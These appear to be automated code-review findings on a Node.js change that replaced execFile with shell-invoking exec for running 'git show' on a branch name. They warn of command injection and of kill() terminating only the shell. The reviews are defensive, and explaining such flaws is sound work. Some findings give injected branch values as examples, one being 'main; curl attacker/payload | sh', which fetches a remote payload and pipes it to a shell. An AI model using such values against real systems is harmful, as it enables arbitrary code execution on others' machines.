findings.title: [P1] Pass the branch as an argument instead of through a shell
findings.body: When `branch` contains shell syntax such as `main; <command>`, `exec` interpolates it into a shell command and executes the appended command with the application's privileges. The previous `execFile("git", ["show", branch])` implementation safely kept the value as one Git argument; retain argument-vector execution instead of invoking a shell.

findings.title: [P2] Preserve cancellation of the actual Git process
findings.body:
`exec()` returns the intermediate shell process rather than `git`. On POSIX systems where `/bin/sh` forks the command, calling `kill()` on the returned `ChildProcess` while a large or slow `git show` is running terminates only the shell; Git can continue consuming CPU, I/O, and holding output pipes. The previous `execFile()` implementation allowed callers to terminate Git directly.

_Recommend validating this comment independently._

findings.title: [P1] Pass the branch as an argument instead of interpolating it into a shell command
findings.body:
`exec` invokes a shell, so an untrusted value such as `HEAD; <command>` executes arbitrary commands with the process's privileges. The previous `execFile` implementation passed the entire value only to Git.

_Recommend validating this comment independently._

findings.title: [P1] Restore argument-vector execution to prevent shell command injection
findings.body:
`exec` invokes a shell and interpolates `branch` verbatim. Any caller passing attacker-controlled input such as `main; curl attacker/payload | sh` enables arbitrary command execution with the application’s privileges. The prior `execFile("git", ["show", branch])` treated the branch as one argument without shell interpretation.

_Recommend validating this comment independently._
